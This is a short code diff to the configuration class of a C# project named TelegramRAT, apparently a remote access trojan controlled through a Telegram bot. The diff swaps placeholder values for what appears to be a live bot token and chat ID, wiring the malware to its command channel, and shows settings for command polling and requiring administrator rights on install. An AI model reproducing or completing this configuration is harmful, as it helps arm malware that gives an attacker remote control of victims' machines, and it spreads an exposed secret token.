@@ -16,8 +16,8 @@ namespace TelegramRAT
     internal sealed class config
     {
         // Telegram settings.
-        public const string TelegramToken = "UR_TELEGRAM_TOKEN_HERE";
-        public const string TelegramChatID = "TELEGRAM_CHAT_ID_HERE";
+        public const string TelegramToken = "7437571765:AAEtgEjYg3FANRfe_pauI_86AVfWa_widdw";
+        public const string TelegramChatID = "7165879853";
         public static int TelegramCommandCheckDelay = 1;
         // Installation to system.
         public static bool AdminRightsRequired = true;
